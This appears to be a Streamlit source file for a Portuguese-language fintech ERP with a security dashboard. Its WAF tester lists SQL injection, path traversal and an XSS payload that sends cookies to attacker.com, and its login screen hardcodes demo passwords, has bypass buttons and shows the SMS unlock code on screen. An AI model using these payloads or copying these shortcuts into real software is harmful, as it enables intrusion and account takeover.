#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Meridian 6.2 — Plataforma Corporativa Multi-Tenant
- Estética e nomenclatura 100% empresarial: Admin/Proprietário, Supervisor, Comissionado e Atendente
- Botão na barra lateral padronizado como EQUIPE & FUNCIONARIOS
- White-Label com 6 temas (Azul, Verde Esmeralda, Roxo Índigo, Dourado, Vermelho Rubi e Grafite):
  o Proprietário define o tema e todos os funcionários herdam automaticamente sem acessar a aba White-Label
- Abas técnicas de TI (Cibersegurança, Supabase, Docker e Monitor FIM) restritas ao Proprietário com confirmação de identidade
"""

import sys
import uuid
import importlib
from pathlib import Path
import streamlit as st
import streamlit.components.v1 as components
import pandas as pd

st.set_page_config(
    page_title="Meridian X | Enterprise Fintech ERP & SOC",
    page_icon="M",
    layout="wide",
    initial_sidebar_state="expanded"
)

ROOT_DIR = Path(__file__).resolve().parent
if str(ROOT_DIR) not in sys.path:
    sys.path.append(str(ROOT_DIR))

import security_compliance
import ui_components
import auth_engine
import enterprise_modules
import pages.pagamentos

importlib.reload(security_compliance)
importlib.reload(ui_components)
importlib.reload(auth_engine)
importlib.reload(enterprise_modules)
importlib.reload(pages.pagamentos)

from auth_engine import MeridianAuthManager, WhiteLabelConfig, LGPDMasker
from security_compliance import (
    TLSAndHeadersManager,
    DataVaultCipher,
    LeastPrivilegeGuard,
    OWASPShield,
    AutomatedPentestScanner,
    IncidentResponsePlaybook,
    SecurityAwarenessTrainer
)
from enterprise_modules import (
    TaxSplitNFSeEngine,
    B2BProposalROIEngine,
    SupabaseHybridSync,
    ProductionDeployGenerator
)
from ui_components import (
    get_meridian_logo_svg,
    apply_meridian_theme,
    render_cookie_consent_modal,
    hide_cookie_widget_when_logged_in,
    render_dashdark_topbar,
    render_dashdark_footer,
    render_hero_banner,
    render_user_badge_sidebar,
    render_kpi_card,
    render_security_radar,
    render_dashdark_tier2_charts,
    render_dashdark_tier3_section,
    render_dashdark_orders_table
)
from pages.pagamentos import render_pagamentos, init_fintech_session

_session_objs = init_fintech_session()
if len(_session_objs) == 4:
    engine, monitor, hub, auth = _session_objs
else:
    engine, monitor, hub = _session_objs
    if "auth_manager" not in st.session_state:
        st.session_state.auth_manager = MeridianAuthManager(engine=engine, monitor=monitor)
    auth = st.session_state.auth_manager

if "tax_engine" not in st.session_state:
    st.session_state.tax_engine = TaxSplitNFSeEngine(engine=engine, monitor=monitor)
if "supa_sync" not in st.session_state:
    st.session_state.supa_sync = SupabaseHybridSync(engine=engine, monitor=monitor)
if "session_csrf_id" not in st.session_state:
    st.session_state.session_csrf_id = uuid.uuid4().hex

tax_engine: TaxSplitNFSeEngine = st.session_state.tax_engine
supa_sync: SupabaseHybridSync = st.session_state.supa_sync
csrf_token_active = LeastPrivilegeGuard.generate_csrf_token(st.session_state.session_csrf_id)

if "user_session" not in st.session_state:
    st.session_state.user_session = None

if "auth_card_mode" not in st.session_state:
    st.session_state.auth_card_mode = "LOGIN"

if "active_nav_page" not in st.session_state:
    st.session_state.active_nav_page = "COMMAND CENTER"

# Carrega o tema global imposto pelo Proprietário e aplica a todos os usuários/funcionários
wl_config = auth.load_whitelabel_config()
apply_meridian_theme(wl_config, is_logged_in=(st.session_state.user_session is not None))


# =============================================================================
# 1. PORTAL DE LOGIN (CENTRALIZADO, SEM BARRA LATERAL, CARGOS DE EMPRESA)
# =============================================================================

def render_login_portal(wl: WhiteLabelConfig):
    render_cookie_consent_modal(wl)

    st.write("")
    st.write("")
    _, col_card, _ = st.columns([1.15, 1.15, 1.15])

    with col_card:
        if st.session_state.auth_card_mode == "LOGIN":
            st.markdown(
                f"""
                <div class="ff-2021-login-main">
                    <div class="ff-hero-badge">{wl.badge_text}</div>
                    <h2 class="ff-2021-login-title">Sign In</h2>
                    <div class="ff-2021-login-sub">{wl.brand_name} — Autenticacao Corporativa PBKDF2-SHA256</div>
                </div>
                """,
                unsafe_allow_html=True
            )

            st.caption("Simular Acesso Rapido por Cargo Padronizado na Empresa:")
            q1, q2 = st.columns(2)
            with q1:
                if st.button("Admin / Proprietario", use_container_width=True):
                    auth.unlock_user_account("admin", hub.security)
                    st.session_state.user_session = auth.authenticate("admin", "admin123")
                    st.session_state.active_nav_page = "COMMAND CENTER"
                    st.rerun()
                if st.button("Comissionado / Vendedor", use_container_width=True):
                    auth.unlock_user_account("dr_cirurgiao", hub.security)
                    st.session_state.user_session = auth.authenticate("dr_cirurgiao", "parceiro123")
                    st.session_state.active_nav_page = "COMMAND CENTER"
                    st.rerun()
            with q2:
                if st.button("Supervisor / Gerente", use_container_width=True):
                    auth.unlock_user_account("lab_analises", hub.security)
                    st.session_state.user_session = auth.authenticate("lab_analises", "parceiro123")
                    st.session_state.active_nav_page = "COMMAND CENTER"
                    st.rerun()
                if st.button("Atendente / Caixa", use_container_width=True):
                    auth.unlock_user_account("recepcao_prime", hub.security)
                    st.session_state.user_session = auth.authenticate("recepcao_prime", "equipe123")
                    st.session_state.active_nav_page = "FINTECH ERP & SPLIT"
                    st.rerun()

            username = st.text_input("Usuario / Login", value="admin", placeholder="admin, vendedor_b, dr_cirurgiao, lab_analises ou recepcao_prime")
            password = st.text_input("Senha de Acesso", value="admin123", type="password")

            falhas_atuais = auth.get_failed_attempts_count(username)
            restantes = max(0, auth.MAX_LOGIN_ATTEMPTS - falhas_atuais)
            bloqueado_agora = auth.is_user_locked(username)

            c_rem, c_info = st.columns(2)
            with c_rem:
                st.checkbox("Remember me", value=True)
            with c_info:
                cor_tent = "#ef4444" if bloqueado_agora else ("#fbbf24" if falhas_atuais > 0 else "#34d399")
                st.markdown(
                    f"<div style='text-align:right; padding-top:8px; font-size:0.78rem; color:{cor_tent}; font-weight:700;'>"
                    f"Tentativas restantes: {restantes}/{auth.MAX_LOGIN_ATTEMPTS}</div>",
                    unsafe_allow_html=True
                )

            if st.button("ENTRAR NO SISTEMA", use_container_width=True):
                if not LeastPrivilegeGuard.verify_csrf_token(st.session_state.session_csrf_id, csrf_token_active):
                    st.error("Falha de validacao de token Anti-CSRF.")
                else:
                    try:
                        user_data = auth.authenticate(username, password, security_agent=hub.security)
                        if user_data:
                            st.session_state.user_session = user_data
                            hub.save_agent_audit_log("USER_LOGIN_SUCCESS", {"username": user_data["username"], "role": user_data["role"]})
                            st.rerun()
                        else:
                            ev = auth.last_auth_event
                            st.markdown(
                                f"""
                                <div class="sec-formal-alert" style="border-color:#f59e0b; border-left-color:#f59e0b;">
                                    <div class="sec-formal-alert-title" style="color:#fbbf24;">AVISO DE AUTENTICACAO</div>
                                    <div class="sec-formal-alert-body">
                                        Credenciais invalidas. Tentativa {ev.get('attempts')} de {ev.get('max_attempts')} registrada.
                                        Restam {ev.get('remaining')} tentativa(s) antes do bloqueio preventivo de seguranca e envio de notificacao por e-mail.
                                    </div>
                                </div>
                                """,
                                unsafe_allow_html=True
                            )
                    except PermissionError:
                        st.rerun()

            if bloqueado_agora:
                codigo_sms_ativo = auth.get_active_sms_unlock_code(username) or auth.reissue_sms_unlock_code(username, 7, True)
                users_dict = auth._load_users()
                u_info = users_dict.get(username.strip().lower(), {})
                email_notificado = u_info.get("email_alerta", "seguranca@meridian.com.br")
                fone_cadastrado = u_info.get("telefone_sms", "+55 (11) 9****-8899")

                st.markdown(
                    f"""
                    <div class="sec-formal-alert">
                        <div class="sec-formal-alert-title">ALERTA DE SEGURANCA — CONTA BLOQUEADA PREVENTIVAMENTE</div>
                        <div class="sec-formal-alert-body">
                            Foram registradas 3 tentativas consecutivas de acesso sem sucesso para a conta <strong>{username.strip().lower()}</strong> e uma notificacao oficial foi disparada para o endereco <strong>{email_notificado}</strong>.<br><br>
                            Se nao foi voce que realizou essas tentativas, sua conta encontra-se bloqueada por seguranca contra acesso nao autorizado. Para realizar o desbloqueio da conta, e obrigatorio concluir a verificacao de identidade informando o codigo de seguranca de 6 a 8 digitos (numerico ou mistura de numeros e letras) enviado por SMS para o dispositivo cadastrado (<strong>{fone_cadastrado}</strong>).
                        </div>
                    </div>
                    """,
                    unsafe_allow_html=True
                )

                st.caption(f"Gateway SMS (Codigo de verificacao de 6-8 digitos enviado para {fone_cadastrado}): `{codigo_sms_ativo}`")

                sms_input = st.text_input(
                    "Codigo de Verificacao SMS (6 a 8 digitos numericos ou alfanumericos)",
                    placeholder="Digite o codigo de 6 a 8 caracteres recebido por SMS",
                    max_chars=8
                )

                c_u1, c_u2 = st.columns(2)
                with c_u1:
                    if st.button("VERIFICAR CODIGO E DESBLOQUEAR", use_container_width=True):
                        if auth.verify_sms_and_unlock(username, sms_input, security_agent=hub.security):
                            st.success("Identidade confirmada. Conta desbloqueada com sucesso. Insira sua senha para acessar.")
                            st.rerun()
                        else:
                            st.error("Codigo de verificacao invalido. Informe um codigo valido de 6 a 8 caracteres.")
                with c_u2:
                    if st.button("GERAR NOVO CODIGO SMS", use_container_width=True):
                        auth.reissue_sms_unlock_code(username, length=7, alphanumeric=True)
                        st.rerun()

                outbox_all = auth.email_dispatcher.load_outbox()
                if outbox_all:
                    ultimo_mail = outbox_all[-1]
                    with st.expander("Visualizar Notificacao Formal de Seguranca Enviada por E-mail"):
                        st.markdown(f"**Destinatario:** `{ultimo_mail.get('to')}` | **Assunto:** `{ultimo_mail.get('subject')}`")
                        components.html(ultimo_mail.get("html_body", ""), height=260, scrolling=True)

            st.markdown(
                """
                <div class="ff-2021-curved-drawer">
                    <p class="ff-2021-drawer-label">DON'T HAVE AN ACCOUNT? SIGN UP</p>
                </div>
                """,
                unsafe_allow_html=True
            )
            if st.button("CRIAR CONTA CORPORATIVA (SIGN UP)", use_container_width=True):
                st.session_state.auth_card_mode = "SIGNUP"
                st.rerun()

        else:
            st.markdown(
                f"""
                <div class="ff-2021-login-main">
                    <div class="ff-hero-badge">ONBOARDING CORPORATIVO MULTI-TENANT</div>
                    <h2 class="ff-2021-login-title">Sign Up</h2>
                    <div class="ff-2021-login-sub">Criar Acesso Padronizado no {wl.brand_name}</div>
                </div>
                """,
                unsafe_allow_html=True
            )

            cargo_padrao = st.selectbox(
                "Cargo Padronizado na Empresa",
                [
                    "Admin / Gerente de Unidade (MERCHANT)",
                    "Supervisor / Auditoria Financeira (AUDITOR)",
                    "Comissionado / Vendedor / Especialista (PARTNER)",
                    "Atendente / Operador de Caixa (STAFF)"
                ]
            )
            if "MERCHANT" in cargo_padrao:
                role_escolhida, nome_cargo = "MERCHANT", "Admin / Gerente de Unidade"
            elif "AUDITOR" in cargo_padrao:
                role_escolhida, nome_cargo = "AUDITOR", "Supervisor / Auditoria"
            elif "PARTNER" in cargo_padrao:
                role_escolhida, nome_cargo = "PARTNER", "Comissionado / Vendedor"
            else:
                role_escolhida, nome_cargo = "STAFF", "Atendente / Caixa"

            nome_emp = st.text_input("Nome Completo do Colaborador ou Empresa", placeholder="Ex: Lucas Andrade")
            novo_user = st.text_input("Login de Acesso", placeholder="Ex: lucas_andrade")

            c_s1, c_s2 = st.columns(2)
            with c_s1:
                vid_emp = st.text_input("ID da Carteira Individual", value="VENDEDOR_B" if role_escolhida in ("STAFF", "AUDITOR") else "VENDEDOR_01")
            with c_s2:
                unidade_vinc = st.text_input("Unidade / Empresa Vinculada", value="VENDEDOR_B")

            c_s3, c_s4 = st.columns(2)
            with c_s3:
                pix_emp = st.text_input("E-mail Corporativo / Chave Pix", placeholder="lucas@empresa.com.br")
            with c_s4:
                comissao_in = st.number_input("Comissao Padrao (%)", min_value=0.0, max_value=95.0, value=30.0 if role_escolhida == "PARTNER" else 0.0)

            nova_senha = st.text_input("Definir Senha", type="password", placeholder="Minimo 6 caracteres")

            if st.button("CONCLUIR CADASTRO E ACESSAR", use_container_width=True):
                try:
                    if not novo_user.strip() or not vid_emp.strip() or not nova_senha.strip():
                        st.warning("Preencha Login, ID da Carteira e Senha.")
                    else:
                        criado = auth.register_merchant(
                            username=novo_user,
                            password=nova_senha,
                            nome_exibicao=nome_emp or novo_user,
                            vendedor_id=vid_emp,
                            chave_pix=pix_emp or "pix@empresa.com.br",
                            role=role_escolhida,
                            cargo=nome_cargo,
                            clinica_id=unidade_vinc,
                            comissao_padrao_pct=comissao_in,
                            email_alerta=pix_emp if "@" in pix_emp else "seguranca@meridian.com.br"
                        )
                        st.session_state.user_session = criado
                        st.session_state.auth_card_mode = "LOGIN"
                        st.rerun()
                except Exception as e:
                    st.error(f"Erro no cadastro: {e}")

            st.markdown(
                """
                <div class="ff-2021-curved-drawer">
                    <p class="ff-2021-drawer-label">ALREADY HAVE AN ACCOUNT? SIGN IN</p>
                </div>
                """,
                unsafe_allow_html=True
            )
            if st.button("VOLTAR PARA TELA DE LOGIN", use_container_width=True):
                st.session_state.auth_card_mode = "LOGIN"
                st.rerun()


# =============================================================================
# 2. SEÇÃO DE EQUIPE & FUNCIONÁRIOS (CARGOS EMPRESARIAIS PADRONIZADOS)
# =============================================================================

def render_secao_equipe_corporativa(user: dict):
    is_admin = (user.get("role") == "ADMIN" or user.get("vendedor_id") == "ALL")
    unidade_padrao = "VENDEDOR_B" if is_admin else (user.get("clinica_id") or user.get("vendedor_id"))

    render_hero_banner(
        title="Gestao de Equipe, Funcionarios & Cargos Corporativos",
        subtitle="Cadastre colaboradores por nivel hierarquico padronizado (Admin/Gerente, Supervisor, Comissionado/Vendedor e Atendente). Todos herdam automaticamente o tema visual definido pelo Proprietario.",
        badge_text=f"CORPORATE RBAC • UNIDADE: {unidade_padrao} • TEMA ATIVO: {wl_config.brand_name}"
    )

    membros = auth.get_clinic_team_members(user)
    wallets_all = engine.get_all_wallets()

    comissionados = [m for m in membros if m.get("role") == "PARTNER"]
    operacionais = [m for m in membros if m.get("role") in ("STAFF", "AUDITOR")]
    saldo_comissionados = sum(float(wallets_all.get(p.get("vendedor_id"), 0.0)) for p in comissionados)

    k1, k2, k3, k4 = st.columns(4)
    with k1:
        render_kpi_card("Total de Funcionarios", f"{len(membros)} Contas", f"Unidade: {unidade_padrao}", badge="RBAC ATIVO", badge_type="blue")
    with k2:
        render_kpi_card("Comissionados / Vendedores", f"{len(comissionados)} Contas", "Com Carteira 3D e Saque Pix proprio", badge="COMISSIONADOS", badge_type="paid")
    with k3:
        render_kpi_card("Saldo dos Comissionados", f"R$ {saldo_comissionados:,.2f}", "Segregado do caixa da empresa", badge="LIQUIDADO", badge_type="paid")
    with k4:
        render_kpi_card("Supervisores & Atendentes", f"{len(operacionais)} Operadores", "Sem acesso a White-Label ou TI", badge="PRIVILEGIO MINIMO", badge_type="blue")

    col_cad, col_list = st.columns([1.25, 1.75], gap="medium")

    with col_cad:
        st.markdown("#### Adicionar Novo Funcionario na Empresa")
        cargo_selecionado = st.selectbox(
            "Cargo Padronizado da Empresa:",
            [
                "Atendente / Operador de Caixa (STAFF — Cria cobrancas e links, sem ver saldos)",
                "Supervisor / Analista Financeiro (AUDITOR — Audita DRE, Excel, Ledger e Notas)",
                "Comissionado / Vendedor / Especialista (PARTNER — Consulta proprio saldo e saca via Pix)",
                "Admin / Gerente de Unidade (MERCHANT — Gestao gerencial da unidade)"
            ]
        )

        if "STAFF" in cargo_selecionado:
            role_code, cargo_label = "STAFF", "Atendente / Caixa"
        elif "AUDITOR" in cargo_selecionado:
            role_code, cargo_label = "AUDITOR", "Supervisor / Auditoria"
        elif "PARTNER" in cargo_selecionado:
            role_code, cargo_label = "PARTNER", "Comissionado / Vendedor"
        else:
            role_code, cargo_label = "MERCHANT", "Admin / Gerente de Unidade"

        c_f1, c_f2 = st.columns(2)
        with c_f1:
            nome_prof = st.text_input("Nome Completo do Funcionario", placeholder="Ex: Camila Rocha")
            login_prof = st.text_input("Login de Acesso", placeholder="Ex: camila_rocha")
            senha_prof = st.text_input("Senha Inicial", value="equipe123", type="password")
        with c_f2:
            setor_prof = st.selectbox(
                "Departamento / Setor",
                ["Comercial & Vendas", "Atendimento & Caixa", "Supervisao & Auditoria", "Diretoria & Gestao"]
            )
            carteira_prof = st.text_input(
                "ID da Carteira no Split",
                value=unidade_padrao if role_code in ("STAFF", "AUDITOR") else "VENDEDOR_02"
            )
            comissao_prof = st.number_input(
                "% de Comissao no Split",
                min_value=0.0, max_value=95.0,
                value=30.0 if role_code == "PARTNER" else 0.0,
                step=5.0
            )

        pix_prof = st.text_input("E-mail Corporativo / Chave Pix", value="funcionario@empresa.com.br")

        if st.button("Cadastrar Funcionario (Com Tema Padrao do Proprietario)", use_container_width=True):
            try:
                if not login_prof.strip() or not nome_prof.strip():
                    st.warning("Informe o Nome e o Login de acesso do funcionario.")
                else:
                    novo_membro = auth.register_merchant(
                        username=login_prof,
                        password=senha_prof,
                        nome_exibicao=nome_prof,
                        vendedor_id=carteira_prof,
                        chave_pix=pix_prof,
                        role=role_code,
                        cargo=f"{cargo_label} ({setor_prof})",
                        clinica_id=unidade_padrao,
                        comissao_padrao_pct=comissao_prof,
                        email_alerta=pix_prof if "@" in pix_prof else "seguranca@meridian.com.br"
                    )
                    hub.save_agent_audit_log("EMPLOYEE_CREATED", {"username": novo_membro["username"], "cargo": cargo_label})
                    st.success(f"Funcionario `{novo_membro['nome_exibicao']}` cadastrado como **{cargo_label}**.")
                    st.rerun()
            except Exception as e:
                st.error(f"Erro ao cadastrar funcionario: {e}")

    with col_list:
        st.markdown("#### Quadro de Funcionarios por Cargo Padronizado")
        rows_team = []
        for m in membros:
            m_role = m.get("role", "MERCHANT")
            m_vid = m.get("vendedor_id", "ALL")
            if m_role in ("STAFF", "AUDITOR"):
                saldo_str = "Restrito (Sem Carteira)"
            elif m_vid == "ALL":
                saldo_str = f"R$ {sum(float(v) for v in wallets_all.values()):,.2f}"
            else:
                saldo_str = f"R$ {float(wallets_all.get(m_vid, 0.0)):,.2f}"

            rows_team.append({
                "Login": m.get("username"),
                "Funcionario": m.get("nome_exibicao"),
                "Cargo na Empresa": m.get("cargo", m_role),
                "Permissao": m_role,
                "Carteira ID": m_vid,
                "Comissao %": f"{float(m.get('comissao_padrao_pct', 0)):.1f}%",
                "Saldo Individual": saldo_str,
                "Tema Imposto": wl_config.brand_name
            })

        st.dataframe(pd.DataFrame(rows_team), use_container_width=True, hide_index=True)


# =============================================================================
# 3. WHITE-LABEL MULTICORES (EXCLUSIVO DO PROPRIETÁRIO — IMPOSTO AOS FUNCIONÁRIOS)
# =============================================================================

def render_whitelabel_studio(wl: WhiteLabelConfig):
    render_hero_banner(
        title="White-Label & Temas Corporativos (Exclusivo Proprietario)",
        subtitle="Defina a paleta de cores e a identidade da plataforma. O tema salvo pelo Proprietario e imposto automaticamente a todos os funcionarios, supervisores e atendentes (que nao possuem acesso a esta aba).",
        badge_text="OWNER THEME ENFORCEMENT • 6 CORPORATE PALETTES"
    )

    col_preset, col_custom = st.columns([1.2, 1.8])

    with col_preset:
        st.markdown("#### Paletas de Cores Corporativas (1 Clique)")
        preset_escolhido = st.selectbox(
            "Escolha o Tema Oficial da Empresa:",
            list(auth.PRESET_THEMES.keys())
        )
        p_preview = auth.PRESET_THEMES[preset_escolhido]
        st.markdown(
            f"""
            <div class="dd-paper" style="padding:16px;">
                <div style="font-size:0.82rem; color:var(--dd-text-secondary); margin-bottom:8px;">Pre-visualizacao da Paleta Selecionada:</div>
                <div style="display:flex; gap:10px; align-items:center;">
                    <div style="width:36px; height:36px; border-radius:8px; background:{p_preview['primary_color']}; border:1px solid #fff;"></div>
                    <div style="width:36px; height:36px; border-radius:8px; background:{p_preview['secondary_color']}; border:1px solid #fff;"></div>
                    <div style="width:36px; height:36px; border-radius:8px; background:{p_preview['accent_color']}; border:1px solid #fff;"></div>
                    <div style="font-weight:700; color:#fff;">{preset_escolhido}</div>
                </div>
            </div>
            """,
            unsafe_allow_html=True
        )

        if st.button("Impor Este Tema para Toda a Empresa Agora", use_container_width=True):
            novo_wl = WhiteLabelConfig(**p_preview)
            auth.save_whitelabel_config(novo_wl)
            st.rerun()

    with col_custom:
        st.markdown("#### Personalizacao Customizada do Proprietario")
        c1, c2 = st.columns([2, 1])
        with c1:
            b_name = st.text_input("Nome da Plataforma / Empresa", value=wl.brand_name)
        with c2:
            b_emoji = st.text_input("Sigla do Logotipo", value=wl.logo_emoji)

        b_sub = st.text_input("Slogan / Subtitulo Corporativo", value=wl.brand_subtitle)
        b_badge = st.text_input("Selo de Seguranca do Topo (Badge)", value=wl.badge_text)

        cor1, cor2, cor3 = st.columns(3)
        with cor1:
            p_color = st.color_picker("Cor Primaria (Botoes/Destaques)", value=wl.primary_color)
        with cor2:
            s_color = st.color_picker("Cor Secundaria (Gradiente)", value=wl.secondary_color)
        with cor3:
            a_color = st.color_picker("Cor de Brilho Neon (Bordas)", value=wl.accent_color)

        lgpd_def = st.checkbox("Impor Mascaramento Automatico de Dados Sensiveis (LGPD) em todos os terminais", value=wl.lgpd_masking_default)

        if st.button("Salvar Tema Customizado & Aplicar em Todos os Funcionarios", use_container_width=True):
            custom_wl = WhiteLabelConfig(
                brand_name=b_name.strip() or "MERIDIAN",
                brand_subtitle=b_sub.strip(),
                badge_text=b_badge.strip(),
                logo_emoji=b_emoji.strip() or "M",
                primary_color=p_color,
                secondary_color=s_color,
                accent_color=a_color,
                lgpd_masking_default=lgpd_def
            )
            auth.save_whitelabel_config(custom_wl)
            st.rerun()


# =============================================================================
# 4. CIBERSEGURANÇA, SPLIT TRIBUTÁRIO, PROPOSTAS, SUPABASE E DOCKER
# =============================================================================

def render_secao_ciberseguranca_soc(user: dict):
    render_hero_banner(
        title="Centro de Operacoes de Seguranca (SOC) — 8 Camadas de Protecao",
        subtitle="HTTPS/TLS, Criptografia em Repouso, Privilegio Minimo (PoLP), OWASP WAF, Notificacao Formal na 3a Falha + Verificacao SMS, Pentest, SOAR e Treinamento.",
        badge_text="OWNER ONLY • ZERO-TRUST ARCHITECTURE • OWASP TOP 10"
    )

    outbox_mails = auth.email_dispatcher.load_outbox()
    siem_logs = auth.email_dispatcher.load_siem_logs()
    lock_data = auth._load_lockouts()
    bloqueados = lock_data.get("blocked_users", [])

    k1, k2, k3, k4 = st.columns(4)
    with k1:
        render_kpi_card("Camadas de Seguranca", "8 / 8 Ativas", "HTTPS, Vault, PoLP, OWASP, SIEM, Pentest, SOAR, Training", badge="100% HARDENED", badge_type="paid")
    with k2:
        render_kpi_card("Regra Anti-Brute Force", "Max. 3 Tentativas", f"{len(bloqueados)} conta(s) bloqueada(s) no momento", badge="LOCKOUT ATIVO", badge_type="blue" if not bloqueados else "fraud")
    with k3:
        render_kpi_card("Notificacoes de Bloqueio (3a Falha)", f"{len(outbox_mails)} Enviadas", "Disparo exclusivo apos a 3a tentativa incorreta", badge="SMTP / OUTBOX", badge_type="paid")
    with k4:
        render_kpi_card("Eventos SIEM Registrados", f"{len(siem_logs)} Logs", "Monitoramento continuo e observabilidade", badge="SIEM ONLINE", badge_type="blue")

    soc_t1, soc_t2, soc_t3, soc_t4, soc_t5 = st.tabs([
        "1. Notificacoes de Bloqueio & SIEM (Camada 5)",
        "2. HTTPS/TLS, Criptografia & PoLP (Camadas 1, 2 e 3)",
        "3. OWASP WAF & Pentest Automatizado (Camadas 4 e 6)",
        "4. Plano de Resposta a Incidentes SOAR (Camada 7)",
        "5. Treinamento de Seguranca da Equipe (Camada 8)"
    ])

    with soc_t1:
        col_mail_cfg, col_mail_list = st.columns([1.15, 1.45], gap="medium")

        with col_mail_cfg:
            st.markdown("#### Configurar Servidor SMTP (Disparo na 3a Tentativa Falha)")
            smtp_cfg = auth.email_dispatcher.load_smtp_config()

            s_host = st.text_input("Servidor SMTP", value=smtp_cfg.get("smtp_host", "smtp.gmail.com"))
            s_port = st.number_input("Porta TLS", min_value=25, max_value=9999, value=int(smtp_cfg.get("smtp_port", 587)))
            s_user = st.text_input("E-mail Remetente (Login SMTP)", value=smtp_cfg.get("smtp_user", ""), placeholder="seguranca@suaempresa.com.br")
            s_pass = st.text_input("Senha de App (App Password)", value=smtp_cfg.get("smtp_password", ""), type="password")
            s_dest = st.text_input("E-mail Padrao do SOC / Proprietario", value=smtp_cfg.get("alert_recipient", "seguranca@meridian.com.br"))

            b_m1, b_m2 = st.columns(2)
            with b_m1:
                if st.button("Salvar Configuracao SMTP", use_container_width=True):
                    auth.email_dispatcher.save_smtp_config(s_host, s_port, s_user, s_pass, s_dest)
                    st.success("Configuracao de e-mail de seguranca salva.")
            with b_m2:
                if st.button("Simular Disparo de 3a Tentativa Agora", use_container_width=True):
                    cod_sim = auth.email_dispatcher.generate_sms_verification_code(7, True)
                    teste_mail = auth.email_dispatcher.send_third_strike_lockout_email(
                        username="operador_teste",
                        recipient_email=s_dest,
                        sms_unlock_code=cod_sim,
                        max_attempts=3
                    )
                    st.success(f"Notificacao formal `{teste_mail['email_id']}` registrada para `{teste_mail['to']}`.")
                    st.rerun()

        with col_mail_list:
            st.markdown("#### Caixa de Saida Auditavel — Notificacoes de Bloqueio (Sem Emojis)")
            if outbox_mails:
                df_mails = pd.DataFrame([
                    {
                        "Protocolo": m.get("email_id"),
                        "Data/Hora": m.get("timestamp"),
                        "Conta Bloqueada": m.get("username"),
                        "Falhas": m.get("attempt"),
                        "Codigo SMS Emitido": m.get("sms_code_generated", "N/A"),
                        "Destinatario": m.get("to"),
                        "Status": m.get("delivery_status")
                    }
                    for m in reversed(outbox_mails[-10:])
                ])
                st.dataframe(df_mails, use_container_width=True, hide_index=True)

                ultimo_mail = outbox_mails[-1]
                with st.expander(f"Visualizar Corpo do E-mail Formal ({ultimo_mail.get('email_id')})", expanded=False):
                    components.html(ultimo_mail.get("html_body", ""), height=270, scrolling=True)
            else:
                st.info("Nenhuma conta atingiu a 3a tentativa falha ate o momento.")

            if siem_logs:
                st.markdown("#### Logs Centralizados SIEM & Observabilidade")
                st.dataframe(pd.DataFrame(list(reversed(siem_logs[-8:]))), use_container_width=True, hide_index=True)

    with soc_t2:
        c_tls, c_vault = st.columns(2, gap="medium")

        with c_tls:
            st.markdown("#### Camada 1: HTTPS / SSL / TLS 1.3 & Security Headers")
            st.json(TLSAndHeadersManager.get_headers_Status())
            st.code(TLSAndHeadersManager.get_tls_deployment_commands(), language="bash")

        with c_vault:
            st.markdown("#### Camada 2: Cofre de Criptografia em Repouso (LGPD / GDPR / HIPAA)")
            vault = DataVaultCipher()
            dado_sensivel = st.text_input("Dado Sensivel para Criptografar em Repouso:", value="Contrato Corporativo CPF 412.889.301-15 | Chave Pix")
            criptografado = vault.encrypt_at_rest(dado_sensivel)
            st.code(criptografado, language="text")
            descriptografado = vault.decrypt_at_rest(criptografado)
            st.success(f"Verificacao HMAC-SHA256 e Descriptografia em Memoria: `{descriptografado}`")

            st.markdown("#### Camada 3: Matriz de Privilegio Minimo (PoLP) & Token CSRF")
            st.caption(f"Token Anti-CSRF ativo na sessao: `{csrf_token_active}`")
            rows_polp = [
                {"Nivel RBAC": k, "Permissoes Estritas Autorizadas": ", ".join(v)}
                for k, v in LeastPrivilegeGuard.PERMISSION_MATRIX.items()
            ]
            st.dataframe(pd.DataFrame(rows_polp), use_container_width=True, hide_index=True)

    with soc_t3:
        col_waf, col_pentest = st.columns([1.1, 1.4], gap="medium")

        with col_waf:
            st.markdown("#### Camada 4: Testador Interativo do Firewall OWASP (SQLi / XSS)")
            payload_teste = st.selectbox(
                "Selecione um vetor para inspecionar no WAF:",
                [
                    "admin' OR '1'='1' -- (Ataque SQL Injection)",
                    "<script>fetch('https://attacker.com?c='+document.cookie)</script> (Ataque XSS)",
                    "../../etc/passwd (Ataque Path Traversal)",
                    "Cliente Corporativo CPF 309.112.448-90 (Entrada Legitima)"
                ]
            )
            raw_test = payload_teste.split(" (")[0]
            if st.button("Inspecionar Entrada no OWASP Shield", use_container_width=True):
                is_clean, msg_waf = OWASPShield.inspect_input(raw_test, "campo_teste")
                if is_clean:
                    render_security_radar(True, "ENTRADA LEGITIMA APROVADA PELO WAF", "Nenhum padrao malicioso detectado.")
                else:
                    render_security_radar(False, "ATAQUE BLOQUEADO PELO OWASP SHIELD", msg_waf)

        with col_pentest:
            st.markdown("#### Camada 6: Auditoria & Pentest Automatizado (8 Vetores)")
            if st.button("Executar Pentest Automatizado & Varredura de Vulnerabilidades", use_container_width=True):
                relatorio_pentest = AutomatedPentestScanner.run_security_audit_suite(auth, engine)
                todos_ok = all(r["Status"] == "PASSED" for r in relatorio_pentest)
                render_security_radar(
                    todos_ok,
                    "PENTEST CONCLUIDO: 8/8 CONTROLES APROVADOS" if todos_ok else "REVISAR CONTROLES",
                    "Validacao de SQLi, XSS, Bloqueio em 3 Tentativas + SMS, CSRF, PoLP, Criptografia At-Rest e SHA-256."
                )
                st.dataframe(pd.DataFrame(relatorio_pentest), use_container_width=True, hide_index=True)

    with soc_t4:
        st.markdown("#### Camada 7: Plano de Resposta a Incidentes & Contencao (SOAR)")
        st.dataframe(pd.DataFrame(IncidentResponsePlaybook.PLAYBOOK_STEPS), use_container_width=True, hide_index=True)

        c_soar1, c_soar2 = st.columns(2, gap="medium")
        with c_soar1:
            st.markdown("##### Desbloqueio de Contas por Codigo SMS ou Intervencao Admin")
            all_users_list = list(auth._load_users().keys())
            user_to_unlock = st.selectbox("Selecione a conta:", all_users_list)
            tentativas_u = auth.get_failed_attempts_count(user_to_unlock)
            cod_sms_u = auth.get_active_sms_unlock_code(user_to_unlock)
            st.caption(f"Tentativas falhas: **{tentativas_u}/{auth.MAX_LOGIN_ATTEMPTS}** | Codigo SMS ativo: `{cod_sms_u or 'Nenhum (Conta Livre)'}`")

            if st.button("Desbloquear Conta & Zerar Contador", use_container_width=True):
                auth.unlock_user_account(user_to_unlock, hub.security)
                st.success(f"Conta `{user_to_unlock}` desbloqueada e contador restaurado para 0/3.")
                st.rerun()

        with c_soar2:
            st.markdown("##### Rotacao de Emergencia de Chaves de API (`X-Meridian-Key`)")
